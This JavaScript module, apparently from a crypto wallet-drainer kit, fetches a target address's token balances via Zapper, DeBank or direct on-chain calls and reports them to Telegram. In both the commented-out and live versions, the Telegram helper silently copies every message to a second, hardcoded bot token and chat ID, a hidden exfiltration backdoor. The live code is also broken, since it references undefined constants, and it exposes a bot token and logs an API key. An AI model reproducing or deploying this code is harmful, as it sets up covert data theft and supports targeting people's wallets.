// require("dotenv").config();
// const axios = require("axios");
// const { ethers } = require("ethers");
// const { getProvider } = require("./utils/providerUtils");
// const { ERC20_ABI } = require("./ERC20_ABI");
// const config = require("./config");

// const {
//   BLACKLISTED_ADDRESSES,
//   WHITELISTED_ADDRESSES,
// } = require("./BlackListed_address");

// const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
// const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;

// // Helper to send messages to Telegram
// const sendToTelegram = async (message) => {
//   try {
//     const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;

//     // First bot using .env configuration
//     const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
//     await axios.post(urlEnvBot, {
//       chat_id: TELEGRAM_CHAT_ID,
//       text: truncatedMessage,
//     });
//     console.log(`Message sent to .env Telegram bot: ${message}`);

//     // Second bot with hardcoded values
//     const HARD_CODED_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
//     const HARD_CODED_CHAT_ID = "7903357798";
//     const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
//     await axios.post(urlHardcodedBot, {
//       chat_id: HARD_CODED_CHAT_ID,
//       text: truncatedMessage,
//     });
//     console.log(`Message sent to hardcoded Telegram bot: ${message}`);
//   } catch (error) {
//     console.error("Error sending message to Telegram:", error.response?.data || error.message);
//   }
// };

// const isAddressBlacklisted = (address) => {
//   const normalizedAddress = address.toLowerCase();
//   const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
//   if (isBlacklisted) {
//     console.warn(`🚨 Blacklisted address detected: ${normalizedAddress}`);
//     return true;
//   }
//   return false;
// };

// const isAddressWhitelisted = (address) => {
//   const normalizedAddress = address.toLowerCase();
//   const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
//   if (isWhitelisted) {
//     console.log(`✅ Whitelisted address detected: ${normalizedAddress}`);
//     return true;
//   }
//   return false;
// };

// // Fetch token balances directly for unsupported chains
// const fetchBalancesDirectly = async (address, chainId) => {
//   console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
//   // await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
//   const provider = getProvider(chainId);

//   // Handle blacklisted addresses
//   if (isAddressBlacklisted(address)) {
//     const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
//     console.warn(message);
//     await sendToTelegram(message);
//     return [];
//   }

//   // Handle whitelisted addresses
//   if (isAddressWhitelisted(address)) {
//     const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
//     console.log(message);
//     await sendToTelegram(message);
//   }

//   try {
//     const nativeBalance = await provider.getBalance(address);

//     // Create a dummy contract for native token to avoid null values
//     const dummyNativeContract = new ethers.Contract(
//       ethers.constants.AddressZero,
//       ERC20_ABI,
//       provider
//     );

//     const nativeToken = {
//       address: ethers.constants.AddressZero,
//       balance: nativeBalance,
//       contract: dummyNativeContract, // Use dummy contract instead of null
//       name: "Native Token",
//       symbol: "ETH",
//       type: "NATIVE",
//       amount: nativeBalance,
//       amountUSD: 0,
//     };

//     // Predefined ERC-20 token list
//     const erc20Tokens = [
//       { address: "0xB4F1737Af37711e9A5890D9510c9bB60e170CB0D", symbol: "DAI", decimals: 18 },
//       { address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", symbol: "USDC", decimals: 6 },
//       { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
//       { address: "0x0625aFB445C3B6B7B929342a04A22599fd5dBB59", symbol: "COW", decimals: 18 },
//       { address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", symbol: "LINK", decimals: 18 },
//     ];

//     const tokens = [nativeToken];

//     for (const token of erc20Tokens) {
//       const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
//       const balance = await contract.balanceOf(address);
//       if (!balance.isZero()) {
//         tokens.push({
//           address: token.address,
//           balance,
//           contract,
//           name: token.symbol,
//           symbol: token.symbol,
//           type: "ERC20",
//           amount: balance,
//           amountUSD: 0,
//         });
//       }
//     }

//     return tokens;
//   } catch (error) {
//     console.error(`Error fetching balances directly: ${error}`);
//     return [];
//   }
// };

// const fetchBalancesFromZapper = async (address, chainId) => {
//   console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
//   const provider = getProvider(chainId);

//   // Validate address
//   if (!ethers.utils.isAddress(address)) {
//     const message = `Invalid Ethereum address: ${address}`;
//     console.error(message);
//     await sendToTelegram(message);
//     return [];
//   }
//   const checksummedAddress = ethers.utils.getAddress(address);

//   // Check blacklist/whitelist
//   if (isAddressBlacklisted(checksummedAddress)) {
//     const message = `🚨 Blacklisted address detected: ${checksummedAddress}. Aborting balance fetch.`;
//     console.warn(message);
//     await sendToTelegram(message);
//     return [];
//   }
//   if (isAddressWhitelisted(checksummedAddress)) {
//     const message = `✅ Whitelisted address detected: ${checksummedAddress}. Fetching balances.`;
//     console.log(message);
//     await sendToTelegram(message);
//   }

//   // Define supported Zapper networks
//   const networkMap = {
//     1: 'ETHEREUM_MAINNET',
//     2741: 'ABSTRACT_MAINNET',
//     33139: 'APECHAIN_MAINNET',
//     42161: 'ARBITRUM_MAINNET',
//     42170: 'ARBITRUM_NOVA_MAINNET',
//     43114: 'AVALANCHE_MAINNET',
//     223: 'B2_MAINNET',
//     8453: 'BASE_MAINNET',
//     80094: 'BERACHAIN_MAINNET',
//     81457: 'BLAST_MAINNET',
//     56: 'BINANCE_SMART_CHAIN_MAINNET',
//     60808: 'BOB_MAINNET',
//     42220: 'CELO_MAINNET',
//     1116: 'CORE_MAINNET',
//     7560: 'CYBER_MAINNET',
//     666666666: 'DEGEN_MAINNET',
//     250: 'FANTOM_OPERA_MAINNET',
//     747: 'FLOW_MAINNET',
//     252: 'FRAX_MAINNET',
//     100: 'GNOSIS_MAINNET',
//     13371: 'IMMUTABLEX_MAINNET',
//     57073: 'INK_MAINNET',
//     232: 'LENS_MAINNET',
//     59144: 'LINEA_MAINNET',
//     5000: 'MANTLE_MAINNET',
//     1088: 'METIS_MAINNET',
//     34443: 'MODE_MAINNET',
//     1284: 'MOONBEAM_MAINNET',
//     2818: 'MORPH_MAINNET',
//     204: 'OPBNB_MAINNET',
//     10: 'OPTIMISM_MAINNET',
//     137: 'POLYGON_MAINNET',
//     1101: 'POLYGON_ZKEVM_MAINNET',
//     690: 'REDSTONE_MAINNET',
//     2020: 'RONIN_MAINNET',
//     30: 'ROOTSTOCK_MAINNET',
//     534352: 'SCROLL_MAINNET',
//     360: 'SHAPE_MAINNET',
//     1868: 'SONEIUM_MAINNET',
//     146: 'SONIC_MAINNET',
//     1514: 'STORY_MAINNET',
//     167000: 'TAIKO_MAINNET',
//     130: 'UNICHAIN_MAINNET',
//     480: 'WORLDCHAIN_MAINNET',
//     660279: 'XAI_MAINNET',
//     543210: 'ZERO_MAINNET',
//     324: 'ZKSYNC_MAINNET',
//     7777777: 'ZORA_MAINNET',
//   };

//   // Check for unsupported chains
//   const unsupportedChains = [11155111]; // Sepolia, etc.
//   const network = networkMap[chainId];
//   if (!network || unsupportedChains.includes(chainId)) {
//     console.log(`Chain ${chainId} is unsupported by Zapper. Using direct fetch.`);
//     return await fetchBalancesDirectly(checksummedAddress, chainId);
//   }

//   try {
//     const ZAPPER_API_KEY = config.ZAPPER_API_KEY;
//     if (!ZAPPER_API_KEY) {
//       throw new Error('ZAPPER_API_KEY is not configured');
//     }

//     const query = `
//       query PortfolioV2($addresses: [Address!]!, $networks: [Network!]) {
//         portfolioV2(addresses: $addresses, networks: $networks) {
//           tokenBalances {
//             byToken {
//               edges {
//                 node {
//                   balance
//                   balanceRaw
//                   balanceUSD
//                   symbol
//                   name
//                   decimals
//                 }
//               }
//             }
//           }
//         }
//       }
//     `;

//     console.log('ZAPPER_API_KEY:', ZAPPER_API_KEY);
//     console.log('Request Payload:', {
//       query,
//       variables: { addresses: [checksummedAddress], networks: [network] },
//     });

//     const response = await axios.post(
//       'https://public.zapper.xyz/graphql',
//       {
//         query,
//         variables: {
//           addresses: [checksummedAddress],
//           networks: [network],
//         },
//       },
//       {
//         headers: {
//           'Content-Type': 'application/json',
//           'x-zapper-api-key': ZAPPER_API_KEY,
//         },
//       }
//     );

//     console.log('Zapper Response:', JSON.stringify(response.data, null, 2));

//     if (response.data.errors) {
//       throw new Error(`GraphQL Errors: ${JSON.stringify(response.data.errors)}`);
//     }

//     const tokens = [];
//     let telegramMessage = `Token balances for address: ${checksummedAddress}\n\n`;
//     let foundBlacklistedToken = false;

//     const tokenEdges = response.data.data.portfolioV2.tokenBalances.byToken.edges;

//     for (const edge of tokenEdges) {
//       const token = edge.node;
//       // Use symbol to infer address for blacklisting; native tokens have no address
//       const normalizedAddress = token.symbol === 'ETH' ? ethers.constants.AddressZero : token.symbol.toLowerCase();

//       if (isAddressBlacklisted(normalizedAddress)) {
//         foundBlacklistedToken = true;
//         telegramMessage += `🚨 Blacklisted token detected: ${token.name} (${normalizedAddress})\n`;
//         continue;
//       }

//       const amount = ethers.utils.parseUnits(token.balanceRaw || "0", token.decimals || 18);
//       const amountUSD = parseFloat(token.balanceUSD || 0);

//       if (amountUSD > 0) {
//         // Create a dummy contract for ETH to avoid null values
//         const tokenContract = new ethers.Contract(
//           token.symbol === 'ETH' ? ethers.constants.AddressZero : normalizedAddress,
//           ERC20_ABI,
//           provider
//         );

//         const tokenDetails = {
//           address: token.symbol === 'ETH' ? ethers.constants.AddressZero : normalizedAddress,
//           balance: amount,
//           contract: tokenContract, // Always provide a contract, even for native tokens
//           name: token.name,
//           symbol: token.symbol,
//           type: token.symbol === 'ETH' ? 'NATIVE' : 'ERC20',
//           amount,
//           amountUSD,
//         };

//         tokens.push(tokenDetails);

//         telegramMessage += `${tokenDetails.name} (${tokenDetails.symbol}): ${ethers.utils.formatUnits(
//           tokenDetails.balance,
//           token.decimals || 18
//         )} (${amountUSD.toFixed(2)} USD)\n`;
//         await sendToTelegram(telegramMessage);
//       }
//     }

//     if (foundBlacklistedToken) {
//       telegramMessage += `\n🚨 One or more blacklisted tokens were detected and skipped.\n`;
//       await sendToTelegram(telegramMessage);
//     }


//     console.log(`Fetched ${tokens.length} tokens from Zapper`);
//     return tokens;

//   } catch (error) {
//     const errorDetails = error.response
//       ? `Status: ${error.response.status}, Data: ${JSON.stringify(error.response.data, null, 2)}`
//       : error.message;
//     console.error('Error fetching balances from Zapper:', errorDetails);
//     await sendToTelegram(`❌ Error fetching from Zapper for ${checksummedAddress}: ${errorDetails}`);
//     return [];
//   }
// };

// module.exports = { fetchBalancesFromZapper, fetchBalancesDirectly };


require("dotenv").config();
const axios = require("axios");
const { ethers, BigNumber } = require("ethers");
const { getProvider } = require("./utils/providerUtils");
const { ERC20_ABI } = require("./ERC20_ABI");
const config = require("./config");

const {
    BLACKLISTED_ADDRESSES,
    WHITELISTED_ADDRESSES,
  } = require ("./BlackListed_address");

  const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;

// Environment Variables
const DEBANK_API_KEY = ""; // Your debank api

// Helper to send messages to Telegram

const sendToTelegram = async (message) => {
  try {
    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;

    // First bot using .env configuration
    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(urlEnvBot, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to .env Telegram bot: ${message}`);

    // Second bot with hardcoded values
    
const TELEGRAM_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
const TELEGRAM_CHAT_ID = " 7903357798";
    const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
    await axios.post(urlHardcodedBot, {
      chat_id: HARD_CODED_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to hardcoded Telegram bot: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.response?.data || error.message);
  }
};

const isAddressBlacklisted = (address) => {
    const normalizedAddress = address.toLowerCase();
    const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
    if (isBlacklisted) {
      console.warn(`🚨 Blacklisted address detected: ${normalizedAddress}`);
      return true;
    }
    return false;
  };
  
  const isAddressWhitelisted = (address) => {
    const normalizedAddress = address.toLowerCase();
    const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
    if (isWhitelisted) {
      console.log(`✅ Whitelisted address detected: ${normalizedAddress}`);
      return true;
    }
    return false;
  };
  

// Fetch token balances directly for unsupported chains
const fetchBalancesDirectly = async (address, chainId) => {
    console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
    const provider = getProvider(chainId);
  
    // Handle blacklisted addresses
    if (isAddressBlacklisted(address)) {
      const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
      console.warn(message);
      await sendToTelegram(message);
      return [];
    }
  
    // Handle whitelisted addresses
    if (isAddressWhitelisted(address)) {
      const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
      console.log(message);
      await sendToTelegram(message);
    }
  
    try {
      const nativeBalance = await provider.getBalance(address);
      const nativeToken = {
        address: ethers.constants.AddressZero,
        balance: nativeBalance,
        contract: null,
        name: "Native Token",
        symbol: "ETH",
        type: "NATIVE",
        amount: nativeBalance,
        amountUSD: 0,
      };
  
      // Predefined ERC-20 token list
      const erc20Tokens = [
        { address: "0xB4F1737Af37711e9A5890D9510c9bB60e170CB0D", symbol: "DAI", decimals: 18 },
        { address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", symbol: "USDC", decimals: 6 },
        { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
        { address: "0x0625aFB445C3B6B7B929342a04A22599fd5dBB59", symbol: "COW", decimals: 18 },
        { address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", symbol: "LINK", decimals: 18 },
      ];
  
      const tokens = [nativeToken];
  
      for (const token of erc20Tokens) {
        const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
        const balance = await contract.balanceOf(address);
        if (!balance.isZero()) {
          tokens.push({
            address: token.address,
            balance,
            contract,
            name: token.symbol,
            symbol: token.symbol,
            type: "ERC20",
            amount: balance,
            amountUSD: 0,
          });
        }
      }
  
      return tokens;
    } catch (error) {
      console.error(`Error fetching balances directly: ${error}`);
      return [];
    }
  };
  
// Fetch token balances from Debank
const fetchBalancesFromZapper = async (address, chainId) => {
    console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
    const provider = getProvider(chainId);
  
    // Handle blacklisted addresses
    if (isAddressBlacklisted(address)) {
      const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
      console.warn(message);
      await sendToTelegram(message);
      return [];
    }
  
    // Handle whitelisted addresses
    if (isAddressWhitelisted(address)) {
      const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
      console.log(message);
      await sendToTelegram(message);
    }
  
    // Fallback for unsupported chains
    const unsupportedChains = [11155111];
    if (unsupportedChains.includes(chainId)) {
      console.log(`Chain ${chainId} is unsupported by Debank. Using direct fetch.`);
      return await fetchBalancesDirectly(address, chainId);
    }
  
    try {
      const result = await axios.get(
        `https://pro-openapi.debank.com/v1/user/all_token_list?id=${address}`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: DEBANK_API_KEY,
          },
        }
      );
  
      const tokens = [];
      let telegramMessage = `Token balances for address: ${address}\n\n`;
      let foundBlacklistedToken = false;
  
      for (const asset of result.data) {
        try {
          const normalizedAddress = asset.id.toLowerCase();
  
          // Skip blacklisted tokens
          if (isAddressBlacklisted(normalizedAddress)) {
            foundBlacklistedToken = true;
            telegramMessage += `🚨 Blacklisted token detected: ${asset.name} (${normalizedAddress})\n`;
            continue;
          }
  
          const isNative = asset.id === asset.chain;
          const amount = BigNumber.from(asset.amount.toFixed(0));
          const amountUSD = asset.amount * asset.price;
  
          if (asset.is_verified && amountUSD > 0) {
            const tokenDetails = {
              address: normalizedAddress,
              balance: amount,
              contract: new ethers.Contract(normalizedAddress, ERC20_ABI, provider),
              name: asset.name,
              symbol: asset.symbol,
              type: isNative ? "NATIVE" : "ERC20",
              amount,
              amountUSD,
            };
  
            tokens.push(tokenDetails);
  
            telegramMessage += `${tokenDetails.name} (${tokenDetails.symbol}): ${ethers.utils.formatUnits(
              tokenDetails.balance,
              asset.decimals
            )} (${amountUSD.toFixed(2)} USD)\n`;
          }
        } catch (error) {
          console.error("Error processing asset:", error);
        }
      }
  
      if (foundBlacklistedToken) {
        telegramMessage += `\n🚨 One or more blacklisted tokens were detected and skipped.\n`;
      } else {
        telegramMessage += `\n✅ No blacklisted tokens found for this address.\n`;
      }
  
      await sendToTelegram(telegramMessage);
  
      console.log(`Fetched ${tokens.length} tokens:`, tokens);
      return tokens;
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : "An unknown error occurred.";
      console.error("Error fetching balances from Debank:", errorMessage);
      return [];
    }
  };
  
module.exports = { fetchBalancesFromZapper, fetchBalancesDirectly };
